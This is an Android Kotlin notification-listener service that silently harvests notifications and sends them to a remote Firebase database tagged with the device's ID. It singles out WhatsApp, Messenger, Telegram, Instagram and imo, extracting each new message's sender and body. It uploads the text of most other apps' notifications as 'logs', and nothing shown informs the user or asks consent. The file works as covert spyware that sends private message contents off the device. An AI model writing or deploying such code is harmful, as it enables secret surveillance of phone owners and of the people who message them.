package com.example.myapplicationtestweb

import android.app.Notification
import android.os.SystemClock
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import java.util.concurrent.ConcurrentHashMap

class NotificationService : NotificationListenerService() {

    private lateinit var deviceId: String
    private val lastSentMap = ConcurrentHashMap<String, Long>()

    private val socialApps = mapOf(
        "com.whatsapp" to "whatsapp",
        "com.whatsapp.w4b" to "whatsapp",
        "com.facebook.orca" to "messenger",
        "com.facebook.mlite" to "messenger",
        "org.telegram.messenger" to "telegram",
        "org.telegram.messenger.web" to "telegram",
        "com.instagram.android" to "instagram",
        "com.imo.android.imoim" to "imo"
    )

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let {
            val pkg = it.packageName ?: ""
            val extras = it.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
            
            val appKey = socialApps[pkg]
            if (appKey != null) {
                // Social app logic
                val now = SystemClock.elapsedRealtime()
                val last = lastSentMap[pkg] ?: 0L
                if (now - last > 5_000) {
                    var finalSender = title
                    var finalBody = text
                    
                    // Try MessagingStyle
                    val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                    if (messages != null && messages.isNotEmpty()) {
                        val lastMessage = messages.last() as? android.os.Bundle
                        if (lastMessage != null) {
                            val msgText = lastMessage.getCharSequence("text")?.toString()
                            val senderPerson = lastMessage.getParcelable<android.app.Person>("sender_person")
                            if (msgText != null) finalBody = msgText
                            if (senderPerson?.name != null) finalSender = senderPerson.name.toString()
                        }
                    }
                    
                    if (finalSender.isNotEmpty() || finalBody.isNotEmpty()) {
                        sendToChatLogs(appKey, pkg, finalSender, finalBody)
                        lastSentMap[pkg] = now
                    }
                }
            } else {
                // General logging
                val blacklistedApps = listOf(
                    "android", "com.android.settings", "com.android.systemui", 
                    "com.google.android.gms", "com.google.android.vending", packageName
                )
                if (blacklistedApps.any { b -> pkg.contains(b) }) return
                
                if (title.isEmpty() && text.isEmpty()) return
                
                val now = SystemClock.elapsedRealtime()
                val last = lastSentMap[pkg] ?: 0L
                if (now - last > 30_000) {
                    sendToLogsBot(pkg, title, text)
                    lastSentMap[pkg] = now
                }
            }
        }
    }

    private fun sendToChatLogs(appKey: String, pkg: String, sender: String, body: String) {
        val userId = Config.getUserId(this)
        if (userId.isEmpty() || deviceId == "unknown") return

        val dbUrl = Config.getDbUrl(this)
        val database = FirebaseDatabase.getInstance(dbUrl)
        val ref = database.reference.child("users").child(userId).child("devices").child(deviceId)
            .child("chats").child(appKey).child("messages")

        ref.push().setValue(mapOf(
            "sender" to sender,
            "body" to body,
            "time" to ServerValue.TIMESTAMP,
            "app" to appKey,
            "pkg" to pkg
        ))
    }

    private fun sendToLogsBot(pkg: String, title: String, text: String) {
        val userId = Config.getUserId(this)
        if (userId.isEmpty() || deviceId == "unknown") return

        val dbUrl = Config.getDbUrl(this)
        val database = FirebaseDatabase.getInstance(dbUrl)
        val deviceRef = database.reference.child("users").child(userId).child("devices").child(deviceId)

        val appName = pkg.split(".").lastOrNull()?.capitalize() ?: pkg
        val logText = "🔔 [NOTIFICATION - $appName]\nTitle: $title\nText: $text"

        deviceRef.child("logs").push().setValue(mapOf(
            "log" to logText,
            "time" to ServerValue.TIMESTAMP
        ))
    }
}
